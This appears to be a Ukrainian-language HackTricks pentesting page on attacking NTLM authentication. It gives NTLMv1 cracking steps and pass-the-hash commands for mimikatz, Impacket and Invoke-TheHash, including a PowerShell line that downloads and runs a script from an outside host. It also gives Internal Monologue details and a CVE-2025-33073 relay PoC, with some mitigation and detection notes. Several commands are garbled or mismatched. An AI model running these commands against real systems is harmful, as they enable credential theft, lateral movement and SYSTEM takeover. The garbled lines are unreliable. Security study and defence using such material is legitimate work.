# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація

У середовищах, де використовуються **Windows XP і Server 2003**, застосовуються хеші LM (Lan Manager), хоча загальновідомо, що їх легко скомпрометувати. Особливий хеш LM `AAD3B435B51404EEAAD3B435B51404EE` означає, що LM не використовується, і є хешем порожнього рядка.

За замовчуванням основним методом автентифікації є протокол **Kerberos**. NTLM (NT LAN Manager) використовується за певних обставин: коли Active Directory відсутній, домен не існує, Kerberos не працює через неправильну конфігурацію або підключення здійснюється за IP-адресою, а не за дійсним іменем хоста.

Наявність заголовка **"NTLMSSP"** у мережевих пакетах свідчить про процес автентифікації NTLM.

Підтримку протоколів автентифікації LM, NTLMv1 і NTLMv2 забезпечує DLL-файл `%windir%\Windows\System32\msv1\_0.dll`.

**Основні моменти**:

- Хеші LM вразливі, а порожній хеш LM (`AAD3B435B51404EEAAD3B435B51404EE`) означає, що він не використовується.
- Kerberos є методом автентифікації за замовчуванням, а NTLM використовується лише за певних умов.
- Пакети автентифікації NTLM можна розпізнати за заголовком "NTLMSSP".
- Системний файл `msv1\_0.dll` підтримує протоколи LM, NTLMv1 і NTLMv2.

## LM, NTLMv1 і NTLMv2

Перевірити й налаштувати протокол, який використовуватиметься, можна так:

### GUI

Запустіть _secpol.msc_ -> Локальні політики -> Параметри безпеки -> Мережева безпека: рівень автентифікації LAN Manager. Є 6 рівнів (від 0 до 5).

![LM, NTLMv1 і NTLMv2 - GUI: запустіть secpol.msc - Локальні політики - Параметри безпеки - Мережева безпека: рівень автентифікації LAN Manager. Є 6 рівнів (від 0 до 5)](<../../images/image (919).png>)

### Реєстр

Так буде встановлено рівень 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Можливі значення:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Базова схема автентифікації домену NTLM

1. **Користувач** вводить свої **облікові дані**
2. Клієнтська машина **надсилає запит на автентифікацію**, вказуючи **ім’я домену** та **ім’я користувача**
3. **Сервер** надсилає **виклик**
4. **Клієнт шифрує** **виклик**, використовуючи хеш пароля як ключ, і надсилає його у відповідь
5. **Сервер надсилає** **контролеру домену** **ім’я домену, ім’я користувача, виклик і відповідь**. Якщо Active Directory **не налаштовано** або ім’я домену збігається з ім’ям сервера, облікові дані **перевіряються локально**.
6. **Контролер домену перевіряє, чи все правильно**, і надсилає інформацію серверу

**Сервер** і **контролер домену** можуть створити **захищений канал** через сервер **Netlogon**, оскільки контролер домену знає пароль сервера (він міститься в базі даних **NTDS.DIT**).

### Локальна схема автентифікації NTLM

Автентифікація відбувається так само, як описано **вище, але** **сервер** знає **хеш користувача**, який намагається автентифікуватися, оскільки він зберігається у файлі **SAM**. Тож замість звернення до контролера домену **сервер сам перевіряє**, чи може користувач пройти автентифікацію.

### Виклик NTLMv1

**Довжина виклику становить 8 байтів**, а **довжина відповіді — 24 байти**.

**Хеш NT (16 байтів)** ділиться на **3 частини по 7 байтів кожна** (7B + 7B + (2B+0x00\*5)): **остання частина доповнюється нулями**. Потім **виклик** **шифрується окремо** кожною частиною, а **результуючі** зашифровані байти **об’єднуються**. Разом: 8B + 8B + 8B = 24 байти.

**Проблеми**:

- Брак **випадковості**
- На 3 частини можна **нападати окремо**, щоб знайти хеш NT
- **DES можна зламати**
- 3-й ключ завжди складається з **5 нулів**.
- За **однакового виклику** **відповідь** буде **однаковою**. Тож можна надіслати жертві як **виклик** рядок "**1122334455667788**" і атакувати відповідь за допомогою **попередньо обчислених rainbow tables**.

### Атака NTLMv1

Unconstrained delegation трапляється рідше в сучасних середовищах, але доступну службу **Print Spooler** усе ще можна використати, щоб примусово викликати автентифікацію на такому хості.

Ви можете використати наявні в AD облікові дані/сесії, щоб **наказати принтеру автентифікуватися** на **хості під вашим контролем**. Потім за допомогою `metasploit auxiliary/server/capture/smb` або `responder` можна **встановити виклик автентифікації на 1122334455667788**, перехопити спробу автентифікації та, якщо вона виконувалася через **NTLMv1**, **зламати її**.\
Якщо ви використовуєте `responder`, можна спробувати застосувати прапорець `--lm`, щоб **знизити рівень** **автентифікації**.\
_Зауважте, що для цього методу автентифікація має виконуватися через NTLMv1 (NTLMv2 не підходить)._

Пам’ятайте, що під час автентифікації принтер використовуватиме обліковий запис комп’ютера, а облікові записи комп’ютерів мають **довгі випадкові паролі**, які ви, **ймовірно, не зможете зламати** за допомогою звичайних **словників**. Але автентифікація **NTLMv1** **використовує DES** ([докладніше тут](#ntlmv1-challenge)), тож її можна зламати за допомогою спеціалізованих сервісів для зламу DES (наприклад, [https://crack.sh/](https://crack.sh) або [https://ntlmv1.com/](https://ntlmv1.com)).

### Атака NTLMv1 за допомогою hashcat

NTLMv1 також можна атакувати за допомогою [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), який перетворює перехоплені повідомлення NTLMv1 у формати, придатні для Hashcat.<sup>[[1]](#references)</sup>

Команда

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

вивело б наведене нижче:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Створіть файл із таким вмістом:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Запустіть hashcat (для розподіленого запуску найкраще скористатися інструментом на кшталт hashtopolis), інакше це займе кілька днів.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

У цьому випадку ми знаємо, що пароль — password, тож для демонстрації трохи схитруємо:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Тепер нам потрібно використати hashcat-utilities, щоб перетворити зламані ключі DES на частини хешу NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Нарешті, остання частина:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Об’єднайте їх:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**Довжина challenge становить 8 байтів**, і **надсилаються 2 відповіді**: одна має довжину **24 байти**, а довжина **іншої** — змінна.

**Перша відповідь** створюється шляхом шифрування **HMAC_MD5** **рядка**, утвореного з **клієнта й домену**, з використанням як **ключа** **хешу MD4** від **NT-хешу**. Потім **результат** використовується як **ключ** для шифрування **challenge** за допомогою **HMAC_MD5**. До нього додається **client challenge завдовжки 8 байтів**. Усього: 24 Б.

**Друга відповідь** створюється з використанням **кількох значень** (нового client challenge, **мітки часу** для запобігання **replay-атакам**...)

Якщо у вас є **PCAP із успішним обміном автентифікаційними даними**, витягніть домен, ім’я користувача, challenge сервера та відповідь NTLMv2, відформатуйте захоплені дані для Hashcat і використайте режим `5600`, щоб спробувати відновити пароль. В архівованому практичному посібнику збережено процедуру вилучення полів із пакетів, а в прикладах Hashcat наведено формат, який приймається зараз.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Отримавши хеш жертви**, ви можете використати його, щоб **видати себе за неї**.\
Потрібно скористатися **інструментом**, який **виконає** **автентифікацію NTLM із використанням** цього **хешу**, або створити новий **sessionlogon** і **впровадити** цей **хеш** у **LSASS**, щоб під час будь-якої **автентифікації NTLM** використовувався саме цей **хеш**. Саме так працює mimikatz.

**Пам’ятайте, що атаки Pass-the-Hash можна виконувати також за допомогою облікових записів комп’ютерів.**

### **Mimikatz**

**Потрібно запускати від імені адміністратора**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Це запускає процес від імені поточного локального користувача, а LSASS пов’язує надані облікові дані з його вихідним мережевим входом. Після цього можна отримувати доступ до мережевих ресурсів від імені вказаного користувача, подібно до `runas /netonly`, не знаючи пароля у відкритому вигляді.

### Pass-the-Hash з Linux

За допомогою Pass-the-Hash з Linux можна отримати виконання коду на машинах Windows.\
[**Перегляньте практичні приклади виконання Pass-the-Hash.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Скомпільовані інструменти Impacket для Windows

Завантажити [бінарні файли impacket для Windows можна тут](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (У цьому випадку потрібно вказати команду; cmd.exe і powershell.exe не підходять для отримання інтерактивної оболонки)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Є ще кілька бінарних файлів Impacket...

### Invoke-TheHash

Скрипти powershell можна отримати тут: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Ця функція поєднує попередні режими. Ви можете передати **кілька хостів**, виключити вибрані цілі та вибрати _SMBExec, WMIExec, SMBClient_ або _SMBEnum_. Якщо вибрати **SMBExec** або **WMIExec** без параметра _**Command**_, функція лише перевірить, чи маєте ви достатні дозволи.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Потрібно запускати від імені адміністратора**

Цей інструмент робить те саме, що й mimikatz (змінює пам’ять LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Ручне віддалене виконання команд у Windows з іменем користувача та паролем


{{#ref}}
../lateral-movement/
{{#endref}}

## Отримання облікових даних із Windows-хоста

Докладніше див. [**Викрадення облікових даних Windows**](../stealing-credentials/README.md).

## Атака Internal Monologue

Атака Internal Monologue — це прихована техніка отримання облікових даних, яка дає змогу зловмиснику отримати NTLM-хеші з комп’ютера жертви **без безпосередньої взаємодії з процесом LSASS**. На відміну від Mimikatz, який зчитує хеші безпосередньо з пам’яті й часто блокується засобами безпеки кінцевих точок або Credential Guard, ця атака використовує **локальні виклики пакета автентифікації NTLM (MSV1_0) через інтерфейс постачальника підтримки безпеки (SSPI)**. Спочатку зловмисник **знижує рівень параметрів NTLM** (наприклад, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), щоб дозволити NetNTLMv1. Потім він уособлює токени наявних користувачів, отримані з запущених процесів, і ініціює локальну автентифікацію NTLM для створення відповідей NetNTLMv1 із використанням відомого виклику.<sup>[[4]](#references)</sup>

Після перехоплення цих відповідей NetNTLMv1 зловмисник може швидко відновити оригінальні NTLM-хеші за допомогою **попередньо обчислених райдужних таблиць**, що дає змогу надалі виконувати атаки Pass-the-Hash для латерального переміщення. Важливо, що атака Internal Monologue залишається прихованою, оскільки не створює мережевого трафіку, не впроваджує код і не запускає пряме зчитування дампів пам’яті, тому захисникам складніше її виявити, ніж традиційні методи на кшталт Mimikatz.

Якщо NetNTLMv1 не приймається через застосовані політики безпеки, зловмисник може не отримати відповідь NetNTLMv1.

Щоб вирішити цю проблему, інструмент Internal Monologue оновили: тепер він динамічно отримує токен сервера за допомогою `AcceptSecurityContext()`, щоб і далі **перехоплювати відповіді NetNTLMv2**, якщо NetNTLMv1 не спрацьовує. NetNTLMv2 набагато складніше зламати, але в обмежених випадках він усе ще дає змогу виконувати relay-атаки або офлайн-перебір.

PoC можна знайти тут: **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay і Responder

**Докладний посібник із виконання цих атак дивіться тут:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Розбір NTLM-викликів із мережевого захоплення

**Можна скористатися** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## *Reflection* через серіалізовані SPN у NTLM і Kerberos (CVE-2025-33073)

У Windows є кілька механізмів захисту, які мають запобігати атакам *reflection*, коли автентифікацію NTLM (або Kerberos), ініційовану з хоста, ретранслюють назад на **той самий** хост, щоб отримати привілеї SYSTEM.  

Microsoft зламала більшість публічних ланцюжків атак за допомогою MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) і подальших виправлень, однак **CVE-2025-33073** показує, що захист можна обійти, скориставшись тим, як **SMB-клієнт обрізає імена службових принципалів (SPN)**, які містять *marshalled* (серіалізовані) цільові дані.<sup>[[5]](#references)[[6]](#references)</sup>

### Коротко про вразливість
1. Зловмисник реєструє **DNS A-запис**, мітка якого кодує marshalled SPN, наприклад:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Жертву змушують автентифікуватися на цьому імені хоста (PetitPotam, DFSCoerce тощо).
3. Коли SMB-клієнт передає цільовий рядок `cifs/srv11UWhRCAAAAA…` до `lsasrv!LsapCheckMarshalledTargetInfo`, виклик `CredUnmarshalTargetInfo` **видаляє** серіалізований блок, залишаючи **`cifs/srv1`**.
4. Тепер `msv1_0!SspIsTargetLocalhost` (або відповідний компонент Kerberos) вважає ціль *localhost*, оскільки коротка частина імені хоста збігається з іменем комп’ютера (`SRV1`).
5. У результаті сервер встановлює `NTLMSSP_NEGOTIATE_LOCAL_CALL` і впроваджує **токен доступу SYSTEM від LSASS** у контекст (для Kerberos створюється ключ підсеансу з позначкою SYSTEM).
6. Ретрансляція цієї автентифікації за допомогою `ntlmrelayx.py` **або** `krbrelayx.py` надає повні права SYSTEM на тому самому хості.<sup>[[5]](#references)</sup>

### Швидкий PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Виправлення та пом’якшення
* Виправлення KB для **CVE-2025-33073** додає перевірку в `mrxsmb.sys::SmbCeCreateSrvCall`, яка блокує будь-яке SMB-з’єднання, ціль якого містить marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Увімкніть **SMB signing** на цільових системах для SMB relay. Для інших цілей перевірте вимоги до підписування або Extended Protection самого протоколу та рівень встановлених виправлень; одного лише SMB signing недостатньо, щоб визначити, чи можливий HTTPS WinRM relay.
* Відстежуйте DNS-записи, схожі на `*<base64>...*`, і блокуйте вектори примусової автентифікації (PetitPotam, DFSCoerce, AuthIP...).

### Ідеї для виявлення
* Мережеві дампи з `NTLMSSP_NEGOTIATE_LOCAL_CALL`, де IP клієнта ≠ IP сервера.
* Kerberos AP-REQ із subsession key і client principal, що збігається з hostname.
* Входи SYSTEM у Windows Event 4624/4648, за якими одразу йдуть віддалені записи SMB з того самого хоста.<sup>[[5]](#references)</sup>

Серіалізоване DNS-ім’я target-information також може спрямувати примусову автентифікацію до зловмисника для **міжпротокольного relay** до вебкінцевої точки реєстрації AD CS. Це окремий результат від reflection на тому самому хості: умови реєстрації [ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), права на запис у DNS, шлях примусової автентифікації та рівень виправлень цільової системи потрібно оцінювати окремо.

Щоб дізнатися про варіант локального reflection за **березень 2026 року**, який зловживає **довільними портами SMB** і **повторним використанням TCP-з’єднання**, щоб отримати `NT AUTHORITY\SYSTEM`, дивіться:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – Мультитул NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Приклади хешів Hashcat – NetNTLMv2 (режим 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – Утиліти PowerShell для Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Атака Internal Monologue: отримання хешів NTLM без доступу до LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection! — Ґрунтовний аналіз CVE-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Злам хешу NTLMv2 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
